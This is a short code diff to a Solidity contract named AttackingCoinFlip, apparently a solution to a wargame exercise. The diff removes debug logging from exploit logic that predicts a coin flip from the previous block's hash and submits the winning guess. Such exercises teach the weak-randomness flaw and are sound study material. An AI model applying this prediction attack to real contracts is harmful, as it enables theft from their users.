@@ -2,8 +2,6 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
-import "hardhat/console.sol";
-
 contract AttackingCoinFlip {
     address public contractAddress;
     uint256 private constant FACTOR =
@@ -17,8 +15,6 @@ contract AttackingCoinFlip {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
-
-        console.log("Guessing", side);
 
         CoinFlip(contractAddress).flip(side);
     }
